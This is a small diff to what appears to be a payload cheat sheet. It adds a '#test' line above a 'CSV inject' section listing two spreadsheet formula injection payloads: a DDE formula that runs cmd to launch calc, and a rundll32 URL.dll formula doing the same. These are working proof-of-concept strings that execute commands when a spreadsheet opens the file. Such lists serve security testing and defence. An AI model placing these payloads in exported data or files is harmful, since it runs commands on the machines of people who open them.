@@ -1,3 +1,5 @@
+#test
+
 ## CSV inject
 - DDE ("cmd";"/C calc";"!A0")A0
 - =rundll32|'URL.dll,OpenURL calc'!A
